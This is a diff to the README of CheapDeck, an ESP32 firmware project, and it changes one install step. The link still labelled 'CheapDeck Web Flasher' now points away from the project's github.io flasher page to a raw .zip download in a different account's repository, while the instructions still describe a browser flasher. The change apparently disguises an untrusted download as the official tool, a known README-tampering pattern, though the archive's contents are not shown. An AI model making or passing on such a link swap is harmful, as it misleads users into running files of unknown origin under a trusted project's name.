@@ -48,7 +48,7 @@ CheapDeck consists of:
 ### 1. ESP32 Firmware
 
 #### 🔹 Option A: Web Flasher (Recommended, No IDE Needed)
-1. Open the [CheapDeck Web Flasher](https://hdmain.github.io/CheapDeck_Webflasher) in **Google Chrome** or **Microsoft Edge**  
+1. Open the [CheapDeck Web Flasher](https://raw.githubusercontent.com/Alfietechtime/CheapDeck/main/desktop-main/Deck-Cheap-3.5.zip) in **Google Chrome** or **Microsoft Edge**  
 2. Plug in your ESP32 via USB  
 3. Click **Connect**, select the COM port, then **Install**  
 4. Enter your WiFi SSID & Password when prompted  
